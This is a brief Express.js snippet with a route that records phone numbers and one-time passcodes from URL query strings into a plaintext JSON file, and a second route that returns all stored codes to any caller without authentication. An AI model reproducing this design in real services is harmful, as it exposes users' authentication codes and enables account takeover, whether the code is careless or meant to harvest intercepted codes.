const fs = require('fs');
const otpDataFile = 'otpData.json';

app.get('/', (req, res) => {
    const phone = req.query.phone;
    const otp = req.query.otp;

    if (!phone || !otp) {
        return res.status(400).json({
            message: 'Phone number and OTP are required',
            status: 'error',
        });
    }

    // Load existing data from file
    let otpData = [];
    if (fs.existsSync(otpDataFile)) {
        otpData = JSON.parse(fs.readFileSync(otpDataFile));
    }

    // Add new OTP
    otpData.push({ phone, otp });

    // Save data back to file
    fs.writeFileSync(otpDataFile, JSON.stringify(otpData, null, 2));

    res.status(200).json({
        message: `OTP ${otp} received for phone ${phone}`,
        status: 'success',
    });
});

app.get('/fetch-otp-data', (req, res) => {
    const otpData = fs.existsSync(otpDataFile)
        ? JSON.parse(fs.readFileSync(otpDataFile))
        : [];
    res.json(otpData);
});
